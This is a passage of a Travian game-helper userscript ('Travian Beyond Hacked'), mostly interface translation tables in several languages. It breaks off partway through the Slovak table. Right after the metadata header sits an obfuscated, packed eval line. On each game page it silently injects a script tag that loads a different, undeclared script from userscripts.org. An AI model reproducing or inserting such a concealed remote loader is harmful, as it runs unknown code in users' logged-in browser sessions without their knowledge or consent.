// ==UserScript==
// @name Travian3 Beyond Hacked FR Pro + Last Update
// @author Victor Garcia modifié par Team : mik french (fr),  Booboo(hu)   //A_r_e_s (br)
// @version 4.49
// @namespace	userscripts.org
// @source	http://userscripts.org/scripts/show/26429
// @identifier	http://userscripts.org/scripts/source/26429.user.js
// @include http://*.travian*.*/*.php*
// @exclude http://*.travian*.*/hilfe.php*
// @exclude http://*.travian*.*/log*.php*
// @exclude http://*.travian*.*/index.php*
// @exclude http://*.travian*.*/anleitung.php*
// @exclude http://*.travian*.*/impressum.php*
// @exclude http://*.travian*.*/anmelden.php*
// @exclude http://*.travian*.*/gutscheine.php*
// @exclude http://*.travian*.*/spielregeln.php*
// @exclude http://*.travian*.*/links.php*
// @exclude http://*.travian*.*/geschichte.php*
// @exclude http://*.travian*.*/tutorial.php*
// @exclude http://*.travian*.*/manual.php*
// @exclude http://*.travian*.*/ajax.php*
// @exclude http://*.travian*.*/ad/*
// @exclude http://*.travian*.*/chat/*
// @exclude http://*.travian*.*/activate.php*
// @exclude http://*.travian*.*/support.php*
// @exclude http://forum.travian*.*
// @exclude http://board.travian*.*
// @exclude http://shop.travian*.*
// @exclude http://www.travian*.*/*
// @exclude http://help.travian*.*/*
// @exclude *.css
// @exclude *.js
// @description	 Travian v3 configurable - Multi LANGUAGE
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


//# TMR variables.
var SCRIPT = {
	url: 'http://userscripts.org/scripts/source/26429.user.js',
	version: '4.49'
};
var CONFIG_TITLEFIX = 2; // 1 : Adds the title inside the page // 2 : Crops the document title and adds the title inside the page // 3 : Replaces the document title with the title inside the page 

// Funcion principal ejecutada cuando se ha cargado toda la pagina
function funcionPrincipal(e){

	// données new
	var tiempo_ejecucion = new Date().getTime();
	var getDocDirection;
	var lonelyTownNEWDID;
	var plustimers = new Object();
	var minustimers = new Object();
	var pageloadtime = new Date();
	// autres données
	var in_reload=0;
	var server = location.hostname;	// Langue
	// NPC Helper's globals
	var npc_url = '/build.php?gid=17&t=3';
	var url = window.location.pathname + window.location.search;
	var npc_res_param = 'gpnpc';
	var npc_name_param = 'gpbn';
	// TQR
	var URLX = { BERICHTE: 'BERICHTE', NACHRICHTEN: 'NACHRICHTEN', ALLIANZ: 'ALLIANZ', KARTE: 'KARTE' };
	var XPTbgTab = ".//table[contains(@class, 'tbg')]";

	try
	{
		var ext = get('lplus1').src.match(/.*img\/(\w+)\/a\//)[1];
	}
	catch(e)
	{
		var ext = server.substring(server.lastIndexOf('.')+1);
		if (ext == 'com') {
			var ext1 = server.substr(0,2);
			if (ext1 == 'rs') ext = ext1;

			// serbian servers: rs1.travian.com, rs2.travian.com, rs3.travian.com
		}
	}

	var textDirection = document.defaultView.getComputedStyle(document.body, null).getPropertyValue('direction');	// for right to left servers
	
	//anglais par défaut
var aLang = {
'ALIANZA': 'Alliance',
'SIM': 'Combat simulator',
'SEGURO': 'Are you sure?',
'MARK': 'Select all',
'PERDIDAS': 'Equivalent of losses',
'RENT': 'Profit',
'SUBIR_NIVEL': 'Extension available',
'ALDEA': 'Village Name',
'ATACAR': 'Attack',
'COMERCIAR': 'Send resources',
'GUARDADO': 'Saved',
'DESP_ABR': 'Mov.',
'FALTA': 'You need',
'HOY': 'today',
'MANYANA': 'tomorrow',
'PAS_MANYANA': 'day after tomorrow',
'MERCADO': 'Marketplace',
'CUARTEL': 'Barracks',
'PUNTO': 'Rally point',
'CORRAL': 'Stable',
'TALLER': 'Workshop',
'ENVIAR': 'Send resources',
'COMPRAR': 'Buy',
'VENDER': 'Sell',
'ENVIAR_IGM': 'Send IGM',
'LISTO': 'Ready',
'EL': 'on',
'A_LAS': 'at',
'EFICIENCIA': 'Efficiency',
'NUNCA': 'Never',
'PC': 'culture points',
'FUNDAR': 'You can found or conquer a new village',
'TIEMPO': 'Time',
'STAT': 'Statistic',
'OFREZCO': 'Offering',
'BUSCO': 'Searching',
'TIPO': 'Type',
'CUALQUIERA': 'Any',
'DISPONIBLE': 'Only available',
'SI': 'Yes',
'NO': 'No',
'MARCADORES': 'Bookmarks',
'ANYADIR': 'Add',
'ENLACE': 'New Bookmark URL',
'TEXTO': 'New Bookmark Text',
'ARCHIVE': 'Archive',
'ELIMINAR': 'Remove',
'ACTUALIZAR': 'refresh',
'REFRESH_INFORMARION': 'refresh Info',
'RESUMEN': 'Summary',
'RECURSO1': 'Wood',
'RECURSO2': 'Clay',
'RECURSO3': 'Iron',
'RECURSO4': 'Crop',
'ALDEA_EXTRA1': 'Send units',
'ALDEA_EXTRA2': 'Send resources',
'ALDEA_EXTRA3': 'Centering on map',
'ALDEA_EXTRA4': 'View Global on village',
'ALDEA_EXTRA5': 'Centering on village',
'ALDEA_EXTRA6': 'Info TSU',
'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
'ALDEA_EXTRA7': 'Info Travian-search',
'ALDEA_EXTRA8': 'Location on Travmap',
'ADD_ALL': 'For all ',
'DEMO': 'Main Building',
'FRIGO': 'Frigo',
'TOOLS': 'Distances and Time',
'TAB1': 'For location on Travmap (red), your Separate multiple alliances with a comma.(ex: A,B,C)',
'TAB2': 'Edit its Bookmarks',
'TAB3': 'Notepad',
'TAB4': 'Price Sales Market',
'TAB5': 'Show Info table means',
'TAB6': 'Show Info table buildings',
'TAB7': 'Show meter deposit',
'TAB8': 'Show Bookmarks build.admin',
'TAB9': 'Show Bookmarks build.military',
'TAB10': 'Show Bookmarks build.for improvement',
'TAB11': 'Show Bookmarks Custom',
'TAB12': 'Show Bookmarks',
'TAB13': 'Show Info TSU',
'TAB13B': 'Show Info Travian World Analyzer',
'TAB14': 'Show Info Travian-search',
'TAB15': 'Show N° on building',
'TAB16': 'Show the content of messages',
'TAB17': 'Show notepad of messages',
'TAB18': 'Show Info Travmap',
'TAB19': 'Show Bookmarks build. Town Hall',
'TAB20': 'Simplifying the list of links to the left',
'TAB21': 'Simplifying the summary of villages',
'TAB22': 'Reposition the summary of villages',
'TAB23': 'Change Attack: Raid / Normal',
'TAB24': 'Reposition of meter deposit',
'TAB25': 'Show total numbers of troops in village (Rallypoint)',
'TAB26': 'Display overview village table',
'TAB27': 'Image server private : [ ]<br>Image server travian : [x]',
'TAB28': 'Insert capital ID (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
'TAB29': 'Show extended icons',
'TAB30': 'Show Battle Analyse',
'TAB31': 'Show BBcode Help',
'TAB32': 'Show N° on means',
'TAB33': 'Show NPC Helper',
'TAB34': 'Show Quick Report',
'TAB35': 'Speed of your unit for popups (ex for the senator: 4)',
'CLEAN': ' Clean',
'PAL': 'Palace',
'RESI': 'Residence',
'MAN': 'Hero s Mansion',
'USI': 'Armoury',
'ARM': 'Blacksmith',
'HOT': 'Town Hall',
'IGMTITLE': 'Topic',
'IGMSENTER': 'sender',
'IGMDATE': 'date',
'IGMTIME': 'time',
'IGMOUTPUT': 'Show the contents of the letters',
'MAXTIME': 'Max time',
'LOGIN': 'Login',
'TT': 'Total view',
'RESS': 'Means',
'DEP': 'Warehouse',
'PC': 'CP',
'TROP': 'Troops',
'MINI': 'Mini',
'ATT': 'Attacks',
'CONS': 'Building',
'FT': 'Party',
'FT1': 'small party',
'FT2': 'big party',
'EXT': 'Extension',
'IN': 'in',
'JUGADOR': 'Player',
'HAB': 'Population',
'COORD': 'Coords',
'ACCION': 'Actions',
'MAPSCAN': 'Scan Map',
'AID': 'Help',
'VITS': 'Speed',
'CAPA': 'Capacity',
'DIST': 'Distance',
'MP': 'To Bookmarks ',
'UPDATE_CHECK': 'Verify Version',
'LAST_VERSION': 'You are using the latest version',
'NEW_VERSION': 'There is a new vesrion available',
'UPDATE_NOW': 'Update now',
'R1': 'Legionnaire', // Romans
'R2': 'Praetorian',
'R3': 'Imperian',
'R4': 'Equites Legati',
'R5': 'Equites Imperatoris',
'R6': 'Equites Caesaris',
'R7': 'Battering Ram',
'R8': 'Fire Catapult',
'R9': 'Senator',
'R10': 'Settler',
'T1': 'Clubswinger', // Teutons
'T2': 'Spearman',
'T3': 'Axeman',
'T4': 'Scout',
'T5': 'Paladin',
'T6': 'Teutonic Knight',
'T7': 'Ram',
'T8': 'Catapult',
'T9': 'Chief',
'T10': 'Settler',
'G1': 'Phalanx', // Gauls
'G2': 'Swordsman',
'G3': 'Pathfinder',
'G4': 'Theutates Thunder',
'G5': 'Druidrider',
'G6': 'Haeduan',
'G7': 'Ram',
'G8': 'Trebuchet',
'G9': 'Chieftain',
'G10': 'Settler',
'N1': 'Rat', // Nature
'N2': 'Spider',
'N3': 'Serpent',
'N4': 'Bat',
'N5': 'Wild boar',
'N6': 'Wolf',
'N7': 'Bear',
'N8': 'Crocodile',
'N9': 'Tiger',
'N10': 'Elephant',
'LVL': 'level',			// Very important
'MARC': 'Merchants',		// Very important
'TOTAL': 'Total',
'WASTED_SPACE': 'Wasted Space',
'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
'SAVEREPORT': 'save report',
'ANONYMIZE': 'anonyme',
'LBA0': 'Total size of attack',
'LBA2': 'Total size of protection against infantry',
'LBA3': 'Total size of protection against a cavalry',
'LBA4': 'The general statistics',
'LBA5': 'Difference of losses',
'LBA6': 'Consumption',
'LBA7': 'Exp of heroes',
'LBA9': 'Equivalent lost in grain',
'LBA10': 'Nominal consumption of grain by army',
'LBA11': 'The hero was not',
'LBA12': 'Hero',
'LBA13': 'Quantity of the carried away raw material',
'LBA14': 'The maximal capacity survived',
'LBA15': 'Attacking',
'LBA16': 'Defending',
'LBA17': 'Copy and go to Combat simulator',
'LBA18': 'Paste',
'BBC': 'Useable BBcodes',
'BBC_B': 'Bold: [b]Text[/b]',
'BBC_I': 'Italic: [i]Text[/i]',
'BBC_U': 'Underscore: [u]Text[/u]',
'BBC_C': 'Center: [c]Text[/c]',
'BBC_COLOR': 'Colors: [color=blue]Text[/color] Tipp: You can use these too: color=#0000FF and #00F',
'BBC_URL': 'Link: [url]http://url[/url] or [url=http://url]Link text[/url]',
'BBC_IMG': 'Image: [img]URL[/img]',
'BBC_LEFT': 'Align left: [<]Text[/<]',
'BBC_RIGHT': 'Align right: [>]Text[/>]',
'BBC_BLINK': 'Blink: [blink]Text[/blink]',
'THS0': 'Current XP:',
'THS1': 'Next Level:',
'THS2': 'Needed:'
};
// Giving hand of identations to decrease file-size...
// TODO:  FINISH JSONIZING aLangs ... - A_r_e_s
switch(ext)
{
case "fr": // Francais par Mik french
var newLang = {
	'ALIANZA': 'Alliance',
	'SIM': 'Simulateur',
	'SEGURO': 'Es-tu sur?',
	'MARK': 'Marquer tous',
	'PERDIDAS': 'Pertes en matériels',
	'RENT': 'Rentabilité',
	'SUBIR_NIVEL': 'Tu peux deja augmenter son niveau',
	'ALDEA': 'Village',
	'ATACAR': 'Attaquer',
	'COMERCIAR': 'Commercer',
	'GUARDADO': 'Sauvegarde',
	'DESP_ABR': 'Déplacer',
	'FALTA': 'Il manque',
	'HOY': 'aujourd\'hui',
	'MANYANA': 'demain',
	'PAS_MANYANA': 'apres-demain',
	'MERCADO': 'Place du marché',
	'CUARTEL': 'Caserne',
	'PUNTO': 'Place de rassemblement',
	'CORRAL': 'Ecurie',
	'TALLER': 'Atelier',
	'ENVIAR': 'Envoyer des ressources',
	'COMPRAR': 'Acheter des ressources',
	'VENDER': 'Vendre des resources',
	'ENVIAR_IGM': 'Envoyer MSG',
	'LISTO': 'Pret',
	'EL': 'le',
	'A_LAS': 'a',
	'EFICIENCIA': 'Efficacité',
	'NUNCA': 'Jamais',
	'PC': 'point(s) de culture',
	'FUNDAR': 'Tu peux déjà coloniser ou conquérir',
	'TIEMPO': 'Temps',
	'STAT': 'Statistiques',
	'OFREZCO': 'Offre',
	'BUSCO': 'Recherche',
	'TIPO': 'Type',
	'CUALQUIERA': 'Toutes',
	'DISPONIBLE': 'Disponible',
	'SI': 'Oui',
	'NO': 'Non',
	'MARCADORES': 'Liens',
	'ANYADIR': 'Ajouter',
	'ENLACE': 'URL du nouveau lien',
	'TEXTO': 'Texte du nouveau lien',
	'ARCHIVE': 'Archive',
	'ELIMINAR': 'Supprimer',
	'ACTUALIZAR': 'Actualiser',
	'REFRESH_INFORMARION': 'Actualiser Info',
	'RESUMEN': 'Résumé',
	'RECURSO1': 'Bois',
	'RECURSO2': 'Terre',
	'RECURSO3': 'Fer',
	'RECURSO4': 'Céréales',
	'ALDEA_EXTRA1': 'Envoyer unités',
	'ALDEA_EXTRA2': 'Envoyer des ressources',
	'ALDEA_EXTRA3': 'Centrer sur carte',
	'ALDEA_EXTRA4': 'Vue Globale du village',
	'ALDEA_EXTRA5': 'Centre du village',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Localisation sur Travmap',
	'ADD_ALL': 'Pour tous ',
	'DEMO': 'Bâtiment Principal',
	'FRIGO': 'Frigo',
	'TOOLS': 'Dist et Tps',
	'TAB1': 'Pour localisation sur Travmap (pastille rouge), Séparer vos alliances multiples par une virgule. (ex: A,B,C)',
	'TAB2': 'Editer ses Marques Pages',
	'TAB3': 'Bloc-note',
	'TAB4': 'Prix de vente au Marché',
	'TAB5': 'Afficher Info tableau ressources',
	'TAB6': 'Afficher Info tableau bâtiments',
	'TAB7': 'Affichage compteur dépot',
	'TAB8': 'Afficher Marques pages bât.administratif',
	'TAB9': 'Afficher Marques pages bât.militaire',
	'TAB10': 'Afficher Marques pages bât.d amélioration',
	'TAB11': 'Afficher raccourci Tableau',
	'TAB12': 'Afficher Marques pages',
	'TAB13': 'Affichage Info TSU',
	'TAB13B': 'Affichage Info Travian World Analyzer',
	'TAB14': 'Affichage Info Travian-search',
	'TAB15': 'Affichage N° sur bâtiments',
	'TAB16': 'Afficher le contenu des messages',
	'TAB17': 'Afficher le bloc-note',
	'TAB18': 'Affichage Info Travmap',
	'TAB19': 'Afficher Marques pages bât. Hôtel de ville',
	'TAB20': 'Simplifier la liste des liens à gauche',
	'TAB21': 'Simplifier le résumé des villages',
	'TAB22': 'Reposition le résumé des villages',
	'TAB23': 'Modifier Attaque: Pillage / Normal',
	'TAB24': 'Reposition le compteur dépot',
	'TAB25': 'Afficher le total des troupes du village dans la place de rassemblement',
	'TAB26': 'Afficher Tableau résumé village',
	'TAB27': 'Image serveur privé : [ ]<br>Image serveur travian : [x]',
	'TAB28': 'Marquer N° ID capital (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Afficher l\'extension d\'icone',
	'TAB30': 'Afficher Battle Analyse',
	'TAB31': 'Afficher Aide BBcode',
	'TAB32': 'Afficher N° sur ressources',
	'TAB33': 'Afficher l\'aide NPC',
	'TAB34': 'Afficher Rapport rapide',
	'TAB35': 'Vitesse de votre unité pour le popups (ex pour le sénateur : 4)',
	'CLEAN': ' Effacer',
	'PAL': 'Palais',
	'RESI': 'Résidence',
	'MAN': 'Manoir du héros',
	'USI': 'Usine armures',
	'ARM': 'Armurerie',
	'HOT': 'Hôtel de ville',
	'IGMTITLE': 'Thème',
	'IGMSENTER': 'Expéditeur',
	'IGMDATE': 'Date',
	'IGMTIME': 'Heure',
	'IGMOUTPUT': 'Afficher le contenu des messages',
	'MAXTIME': 'Temps maximum',
	'LOGIN': 'Login',
	'TT': 'Vue globale',
	'RESS': 'Ressources',
	'DEP': 'Dépôt de ressource',
	'PC': 'PC',
	'TROP': 'Troupes',
	'MINI': 'Mini',
	'ATT': 'Attaques',
	'CONS': 'Constructions',
	'FT': 'Fête',
	'FT1': 'petite fête',
	'FT2': 'grande fête',
	'EXT': 'Extension',
	'IN': 'dans',
	'JUGADOR': 'Joueur',
	'HAB': 'Population',
	'COORD': 'Coordonnées',
	'ACCION': 'Actions',
	'MAPSCAN': 'Scan map',
	'AID': 'Aide',
	'VITS': 'Vitesse',
	'CAPA': 'Capacité',
	'DIST': 'Distance',
	'MP': 'Marque-page ',
	'UPDATE_CHECK': 'Vérifier version',
	'LAST_VERSION': 'Vous avez la dernière version disponible',
	'NEW_VERSION': 'Une nouvelle version est disponible',
	'UPDATE_NOW': 'Mettre à jour maintenant',
	'R1': 'Legionnaire', //romain
	'R2': 'Prétorien',
	'R3': 'Impérian',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Bélier',
	'R8': 'Catapulte de feu',
	'R9': 'Sénateur',
	'R10': 'Colon',
	'T1': 'Combattant au gourdin', //teuton
	'T2': 'Combattant à la lance',
	'T3': 'Combattant à la hache',
	'T4': 'Eclaireur',
	'T5': 'Paladin',
	'T6': 'Cavalier Teuton',
	'T7': 'Bélier',
	'T8': 'Catapulte',
	'T9': 'Chef de tribu',
	'T10': 'Colon',
	'G1': 'Phalange', //gaulois
	'G2': 'Combattant à l épée',
	'G3': 'Eclaireur',
	'G4': 'Eclair de Toutatis',
	'G5': 'Cavalier druide',
	'G6': 'Hédouin',
	'G7': 'Bélier',
	'G8': 'Catapulte de Guerre',
	'G9': 'Chef',
	'G10': 'Colon',
	'N1': 'Rat', //nature
	'N2': 'Araignée',
	'N3': 'Serpent',
	'N4': 'Chauves-souris',
	'N5': 'Sangliers',
	'N6': 'Loups',
	'N7': 'Ours',
	'N8': 'Crocodile',
	'N9': 'Tigre',
	'N10': 'Elephant',
	'LVL': 'niveau',			//tres important
	'MARC': 'Marchands',		//tres important
	'TOTAL': 'Total',
	'WASTED_SPACE' : 'Gaspillage',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Texte',
	'LBA0':'Taille totale de l\'attaque',
	//'LBA1':'Equivalent des pertes',
	'LBA2':'Taille totale de la défense contre l\'infanterie',
	'LBA3':'Taille totale de la défense contre la cavalerie',
	'LBA4':'Statistiques générales',
	'LBA5':'Différence de pertes',
	'LBA6':'Consommation',
	'LBA7':'Exp du héro',
	//'LBA8':'Capacité',
	'LBA9':'Equivalent perdu en céréales',
	'LBA10':'Consommation de céréales par l\'armée',
	'LBA11':'Le héro n\'était pas présent',
	'LBA12':'Héro',
	'LBA13':'Quantité de matières premières emportées',
	'LBA14':'Capacité de charge',
	'LBA15':'Attaquant',
	'LBA16':'Défenseur',
	'LBA17': 'Copier et aller au simulateur de combat',
	'LBA18': 'Coller',
	'BBC': 'Utiliser BBcodes',
	'BBC_B': 'Gras: [b]Texte[/b]',
	'BBC_I': 'Italique: [i]Texte[/i]',
	'BBC_U': 'Souligner: [u]Texte[/u]',
	'BBC_C': 'Centrer: [c]Texte[/c]',
	'BBC_COLOR': 'Couleurs: [color=blue]Texte[/color] Conseil: Vous pouvez utiliser le Codage RVB: color=#0000FF et #00F',
	'BBC_URL': 'Liens: [url]http://url[/url] ou [url=http://url]Liens texte[/url]',
	'THS0': 'Courant:',
	'THS1': 'Suivant:',
	'THS2': 'Besoin:'
	}
	break;
	case "pt":		// Por MikeP (Dedicado a Li), corregido y ampliado por Joao Frade + google mik
	case "br":
	var newLang = {
	'ALIANZA': 'Alian&ccedil;a',
	'SIM': 'Simulador',
	'SEGURO': 'Tem a certeza?',
	'MARK': 'Seleccionar tudo',
	'PERDIDAS': 'Perdas',
	'RENT': 'Lucro',
	'SUBIR_NIVEL': 'J&aacute; podes subir de n&iacute;vel',
	'ALDEA': 'Nome da Aldeia',
	'ATACAR': 'Atacar',
	'COMERCIAR': 'Enviar recursos',
	'GUARDADO': 'Guardado',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Faltam',
	'HOY': 'hoje',
	'MANYANA': 'amanh&atilde;',
	'PAS_MANYANA': 'depois de amanh&atilde;',
	'MERCADO': 'Mercado',
	'CUARTEL': 'Quartel',
	'PUNTO': 'ponto de encontro',
	'CORRAL': 'Cavalari&ccedil;a',
	'TALLER': 'Oficina',
	'ENVIAR': 'Enviar mat&eacute;rias primas',
	'COMPRAR': 'Comprar mat&eacute;rias primas',
	'VENDER': 'Vender mat&eacute;rias primas',
	'ENVIAR_IGM': 'Enviar IGM',
	'LISTO': 'Dispon&iacute;vel',
	'EL': 'a',
	'A_LAS': '&agrave;s',
	'EFICIENCIA': 'Efici&ecirc;ncia',
	'NUNCA': 'Nunca',
	'PC': 'pontos de cultura',
	'FUNDAR': 'Podes fundar ou conquistar uma nova aldeia',
	'TIEMPO': 'Tempo',
	'STAT': 'Estat&iacute;stica',
	'OFREZCO': 'Oferece',
	'BUSCO': 'Pede',
	'TIPO': 'Tipo',
	'CUALQUIERA': 'Qualquer',
	'DISPONIBLE': 'S&oacute; dispon&iacute;veis',
	'SI': 'Sim',
	'NO': 'N&atilde;o',
	'MARCADORES': 'Atalhos',
	'ANYADIR': 'Adicionar',
	'ENLACE': 'Sitio do novo atalho',
	'TEXTO': 'Texto para o novo atalho',
	'ARCHIVE': 'Archive',
	'ELIMINAR': 'Eliminar',
	'ACTUALIZAR': 'Atualizar',
	'REFRESH_INFORMARION': 'Atualizar info',
	'RESUMEN': 'Resumo',
	'RECURSO1': 'Madeira',
	'RECURSO2': 'Barro',
	'RECURSO3': 'Ferro',
	'RECURSO4': 'Cereais',
	'ALDEA_EXTRA1': 'Enviar tropas',
	'ALDEA_EXTRA2': 'Enviar recursos',
	'ALDEA_EXTRA3': 'Centramento no mapa',
	'ALDEA_EXTRA4': 'Aldeia global',
	'ALDEA_EXTRA5': 'Centro aldeia',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Situação em Travmap',
	'ADD_ALL': 'Para todos os ',
	'DEMO': 'Demolição',
	'FRIGO': 'Frigo',
	'TOOLS': 'Distâncias_e_Hora',
	'TAB1': 'Para a localização Travmap (vermelho), seu Separe várias alianças com uma vírgula. (ex: A,B,C)',
	'TAB2': 'Edite suas páginas marcas',
	'TAB3': 'Bloco de notas',
	'TAB4': 'Preço vendas mercado',
	'TAB5': 'Info mesa recursos (0 ou 1)',
	'TAB6': 'Info tabela edifícios (0 ou 1)',
	'TAB7': 'Vendo metros depósito (0 ou 1)',
	'TAB8': 'Marcas páginas edif.administratif (0 ou 1)',
	'TAB9': 'Marcas páginas edif.militaire (0 ou 1)',
	'TAB10': 'Marcas páginas edif.d melhoria (0 ou 1)',
	'TAB11': 'Marcas páginas Perso Mik (0 ou 1)',
	'TAB12': 'Mostrar páginas Marks',
	'TAB13': 'Mostrar Info TSU (0 ou 1)',
	'TAB13B': 'Mostrar Info Travian World Analyzer (0 ou 1)',
	'TAB14': 'Mostrar Info Travian-search (0 ou 1)',
	'TAB15': 'Sem vídeo sobre imóveis (0 ou 1)',
	'TAB16': 'Mostrar o conteúdo das mensagens (0 ou 1)',
	'TAB17': 'Ver notepad cargos de nível (0 ou 1)',
	'TAB18': 'Mostrar Info Travmap (0 ou 1)',
	'TAB19': 'Marcas páginas edif. Casa do Povo (0 ou 1)',
	'TAB20': 'Simplificar a lista de links para a esquerda (0 ou 1)',
	'TAB21': 'Simplificar o resumo das aldeias (0 ou 1)',
	'TAB22': 'Reposicionar o resumo das aldeias (0 ou 1)',
	'CLEAN': ' Apagar',
	'PAL': 'Palácio',
	'RESI': 'Residência',
	'MAN': 'Mansão do Herói',
	'USI': 'Fábrica de Armaduras',
	'ARM': 'Ferreiro',
	'HOT': 'Casa do Povo',
	'IGMTITLE': 'Tema',
	'IGMSENTER': 'Dispatcher',
	'IGMDATE': 'Data',
	'IGMTIME': 'Tempo',
	'IGMOUTPUT': 'Mostrar o conteúdo das mensagens',
	'MAXTIME': 'Tempo máximo',
	'LOGIN': 'Login',
	'TT': 'Visão geral',
	'RESS': 'Recursos',
	'DEP': 'Apresentação de recurso',
	'PC': 'PC',
	'TROP': 'Tropas',
	'MINI': 'Mini',
	'ATT': 'Ataques',
	'CONS': 'Construção',
	'FT': 'Festa',
	'FT1': 'pequena festa',
	'FT2': 'grande festa',
	'EXT': 'Prorrogação',
	'IN': 'em',
	'JUGADOR': 'Jogador',
	'HAB': 'Habitantes',
	'ACCION': 'Ac&ccedil;&otilde;es',
	'COORD': 'Coordenadas',
	'LVL': 'vel',
	'MARC': 'Mercadores',
	'TOTAL': 'Total',
	'WASTED_SPACE' : 'Espaço Desperdiçado'
	}
	break;		//eror : Slovak language only 30%
	case "sk":	//updated by Matthew-PoP
	var newLang = {
	'ALIANZA': 'Alliancia',
	'SIM': 'Bojový simulátor',
	'SEGURO': 'Naozaj?',
	'MARK': 'Vybrať všetko',
	'PERDIDAS': 'Strata',
	'RENT': 'Zisk',
	'SUBIR_NIVEL': 'Môžeš rozšíriť',
	'ALDEA': 'Meno dediny',
	'ATACAR': 'Útok',
	'COMERCIAR': 'Poslať suroviny',
	'GUARDADO': 'Uložené',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Potrebuješ',
	'HOY': 'dnes',
	'MANYANA': 'zajtra',
	'PAS_MANYANA': 'pozajtra',
	'MERCADO': 'Obchod',
	'CUARTEL': 'Kasárne',
	'PUNTO': 'Zhromaždisko',
	'CORRAL': 'Stajne',
	'TALLER': 'Dielňa',
	'ENVIAR': 'Poslať suroviny',
	'COMPRAR': 'Kúpiť',
	'VENDER': 'Predať',
	'ENVIAR_IGM': 'Poslať správu',
	'LISTO': 'Pripravené',
	'EL': 'na',
	'A_LAS': 'o',
	'EFICIENCIA': 'Efektivita',
	'NUNCA': 'Nikdy',
	'PC': 'Kultúrne body',// is not necessary
	'FUNDAR': 'You can found or conquer a new village',
	'TIEMPO': 'Čas',
	'STAT': 'Štatistika',
	'OFREZCO': 'Ponuka',
	'BUSCO': 'Hľadám',
	'TIPO': 'Typ',
	'CUALQUIERA': 'Hociaká',
	'DISPONIBLE': 'Len dostupné',
	'SI': 'Áno',
	'NO': 'Nie',
	'MARCADORES': 'Záložky',
	'ANYADIR': 'Pridať',
	'ENLACE': 'Url záložky',
	'TEXTO': 'Text záložky',
	'ARCHIVE': 'Archív',
	'ELIMINAR': 'Vymazať',
	'ACTUALIZAR': 'obnoviť',
	'REFRESH_INFORMARION': 'obnoviť Informácie',
	'RESUMEN': 'Zhrnutie',
	'RECURSO1': 'Dreva',
	'RECURSO2': 'Hlin',
	'RECURSO3': 'Železa',
	'RECURSO4': 'Obilia',
	'ALDEA_EXTRA1': 'Poslať jednotky',
	'ALDEA_EXTRA2': 'Poslať suroviny',
	'ALDEA_EXTRA3': 'Vecentrovať na mape',
	'ALDEA_EXTRA4': 'View Global on village',
	'ALDEA_EXTRA5': 'Vecentrovať na dedine',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Infomácie na Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info na Travian-search',
	'ALDEA_EXTRA8': 'Pozícia na Travmap',
	'ADD_ALL': 'Pre všetkých',
	'DEMO': 'Main Building',
	'FRIGO': 'Frigo',
	'TOOLS': 'vzdialenosť a čas',
	'TAB1': 'For location on Travmap (red), your Separate multiple alliances with a comma.(ex: A,B,C)',
	'TAB2': 'Edituj záložku',
	'TAB3': 'Poznámkový blok',
	'TAB4': 'Price Sales Market',
	'TAB5': 'Ukáž info tabuľu mužov',
	'TAB6': 'Ukáž info tabuľu o budovách',
	'TAB7': 'Show meter deposit',
	'TAB8': 'Show Bookmarks build.admin',
	'TAB9': 'Show Bookmarks build.military',
	'TAB10': 'Ukáž Bookmarks build.for improvement',
	'TAB11': 'Ukáž Bookmarks Custom',
	'TAB12': 'Ukáž záložky',
	'TAB13': 'Show Info TSU',
	'TAB13B': 'Show Info Travian World Analyzer',
	'TAB14': 'Show Info Travian-search',
	'TAB15': 'Show N° on building',
	'TAB16': 'Show the content of messages',
	'TAB17': 'Show notepad of messages',
	'TAB18': 'Show Info Travmap',
	'TAB19': 'Show Bookmarks build. Town Hall',
	'TAB20': 'Simplifying the list of links to the left',
	'TAB21': 'Simplifying the summary of villages',
	'TAB22': 'Reposition the summary of villages',
	'TAB23': 'Change Attack: Raid / Normal',
	'TAB24': 'Reposition of meter deposit',
	'TAB25': 'Show total numbers of troops in village (Rallypoint)',
	'TAB26': 'Display overview village table',
	'TAB27': 'Image server private : [ ]<br>Image server travian : [x]',
	'TAB28': 'Insert capital ID (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Show extended icons',
	'TAB30': 'Show Battle Analyse',
	'TAB31': 'Show BBcode Help',
	'TAB32': 'Show N° on means',
	'TAB33': 'Show NPC Helper',
	'TAB34': 'Show Quick Report',
	'TAB35': 'Speed of your unit for popups (ex for the senator: 4)',
	'CLEAN': ' Clean',
	'PAL': 'Palac',
	'RESI': 'Rezidencia',
	'MAN': 'Dvor hrdinov',
	'USI': 'Zbrojnica',
	'ARM': 'Kováčšká dielňa',
	'HOT': 'Radnica',
	'IGMTITLE': 'Téma',
	'IGMSENTER': 'odosielateľ',
	'IGMDATE': 'dátum',
	'IGMTIME': 'čas',
	'IGMOUTPUT': 'Show the contents of the letters',
	'MAXTIME': 'Maximálny čas',
	'LOGIN': 'Login',
	'TT': 'Total view',
	'RESS': 'Means',
	'DEP': 'Warehouse',
	'PC': 'CP',
	'TROP': 'Troops',
